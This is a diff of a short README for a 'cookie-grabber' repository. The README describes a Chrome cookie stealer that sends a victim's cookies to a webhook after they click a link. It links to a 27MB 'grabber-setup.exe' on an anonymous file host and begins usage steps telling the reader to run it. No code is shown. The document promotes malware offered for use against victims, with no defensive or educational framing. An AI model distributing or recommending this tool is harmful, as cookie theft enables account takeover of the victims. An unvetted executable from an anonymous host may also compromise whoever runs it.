@@ -1,9 +1,9 @@
 # cookie-grabber
+This is a simple chrome cookie grabber. When you victim clicks on a link their cookies are sent to a webhook.
+
 Cookie Grabber(Sorry I couldn't upload directly to github because its too big.)
 
 Download(27MB): https://anonfiles.com/PfV4sbnfyc/grabber-setup_exe
-
-This is a simple chrome cookie grabber. When you victim clicks on a link their cookies are sent to a webhook.
 
 How to use 
 1. Run grabber-setup.exe 
